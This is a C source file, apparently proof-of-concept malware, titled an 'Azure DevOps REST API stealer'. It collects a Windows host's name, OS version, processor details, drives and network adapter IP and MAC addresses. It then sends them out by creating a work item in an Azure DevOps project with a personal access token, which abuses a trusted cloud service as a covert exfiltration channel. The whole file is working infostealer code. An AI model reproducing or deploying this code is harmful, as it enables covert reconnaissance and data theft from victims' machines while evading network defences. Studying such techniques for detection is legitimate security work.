/*
 * hack3.c
 * Azure DevOps REST API stealer
 * author @cocomelonc
 */
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")

int sendToAzure(const char* project, const char* pat, const char* title, const char* description) {
  HINTERNET hSession, hConnect, hRequest;
  char authHeader[512];
  char jsonBody[10000];

  DWORD bytesRead;
  char buffer[8192];

  // construct json body
  snprintf(jsonBody, sizeof(jsonBody),
    "[{\"op\":\"add\",\"path\":\"/fields/System.Title\",\"value\":\"%s\"},"
    "{\"op\":\"add\",\"path\":\"/fields/System.Description\",\"value\":\"%s\"}]",
    title, description);

  // encode PAT to base64 (PAT without username
  // for Azure DevOps ":PAT")
  char patAuth[256];
  snprintf(patAuth, sizeof(patAuth), ":%s", pat);

  DWORD patLen = lstrlenA(patAuth);
  DWORD base64Len = 0;
  if (!CryptBinaryToStringA((BYTE*)patAuth, patLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len)) {
    fprintf(stderr, "Base64 length error\n");
    return 1;
  }
  char patBase64[256];
  if (!CryptBinaryToStringA((BYTE*)patAuth, patLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, patBase64, &base64Len)) {
    fprintf(stderr, "Base64 encode error\n");
    return 1;
  }

  snprintf(authHeader, sizeof(authHeader), "Authorization: Basic %s", patBase64);

  // printf("%s\n", authHeader);

  hSession = WinHttpOpen(L"Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  hConnect = WinHttpConnect(hSession, L"dev.azure.com", INTERNET_DEFAULT_HTTPS_PORT, 0);

  char path[512];
  snprintf(path, sizeof(path), "/cocomelonkz/%s/_apis/wit/workitems/$Task?api-version=7.1", project);

  wchar_t wpath[512];
  MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, 512);

  hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

  wchar_t wauthHeader[512];
  wchar_t wctypeHeader[] = L"Content-Type: application/json-patch+json";
  MultiByteToWideChar(CP_ACP, 0, authHeader, -1, wauthHeader, 512);

  WinHttpAddRequestHeaders(hRequest, wauthHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, wctypeHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);

  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)jsonBody, strlen(jsonBody), strlen(jsonBody), 0);
  WinHttpReceiveResponse(hRequest, NULL);

  // get response (checking)
  WinHttpReceiveResponse(hRequest, NULL);

  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);

  return 0;
}

int main() {
  char systemInfo[4096];

  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);

  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);

  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);

  DWORD drives = GetLogicalDrives();

  IP_ADAPTER_INFO adapterInfo[16];
  DWORD adapterInfoSize = sizeof(adapterInfo);
  GetAdaptersInfo(adapterInfo, &adapterInfoSize);

  snprintf(systemInfo, sizeof(systemInfo),
    "Host Name: %s\n"
    "OS Version: %d.%d.%d\n"
    "Processor Architecture: %d\n"
    "Number of Processors: %d\n"
    "Logical Drives: %X\n",
    hostName,
    osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
    sysInfo.wProcessorArchitecture,
    sysInfo.dwNumberOfProcessors,
    drives);

  for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
    snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
      "Adapter Name: %s\n"
      "IP Address: %s\n"
      "Subnet Mask: %s\n"
      "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n\n",
      adapter->AdapterName,
      adapter->IpAddressList.IpAddress.String,
      adapter->IpAddressList.IpMask.String,
      adapter->Address[0], adapter->Address[1], adapter->Address[2],
      adapter->Address[3], adapter->Address[4], adapter->Address[5]);
  }

  sendToAzure("hack1", "<PAT>", "meow2", systemInfo);
  return 0;
}
